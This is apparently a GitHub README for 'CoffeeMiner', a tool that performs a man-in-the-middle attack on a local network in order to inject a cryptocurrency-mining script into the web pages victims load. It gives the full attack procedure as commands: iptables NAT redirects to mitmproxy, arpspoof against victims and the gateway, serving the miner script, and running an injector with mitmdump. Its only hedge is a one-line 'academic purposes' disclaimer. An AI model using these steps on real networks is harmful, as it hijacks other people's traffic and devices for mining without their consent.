# CoffeeMiner

Collaborative Coffee Mining Pool.

**Warning: this project is only with academic purposes.**


## Concept
- Performs a MITM attack
- Injects a js script in all the HTML pages requested by the victims
- The js script injected contains a cryptocurrency miner
- All the devices victims connected to the Lan network, will be mining for the CoffeeMiner


## Use
- install.sh
```
bash install.sh
```
- edit victims.txt with one IP per line
- run.py
```
python run.py ipgateway
```




---



#### Manual use
- needs to have installed **mitmproxy**
    https://mitmproxy.org/
    - installation:
    ```
        sudo apt-get install python3-dev python3-pip libffi-dev libssl-dev

        pip3 install --user mitmproxy
    ```

- needs python 3.*


- configure IPTABLES

```
echo 1 > /proc/sys/net/ipv4/ip_forward

iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080
```

- arpspoof to the victims
```
arpspoof -i eth0 -t <victim_ip> <gateway_ip>
arpspoof -i eth0 -t <gateway_ip> <victim_ip>
```
- execute the httpServer.py that will serve the script.js that contains the minner:
```
python httpServer.py
```

- execute the mitmproxy with the injector.py script:
```
#~/.local/bin/mitmdump -s "injector.py http://127.0.0.1:8000/script.js"
```
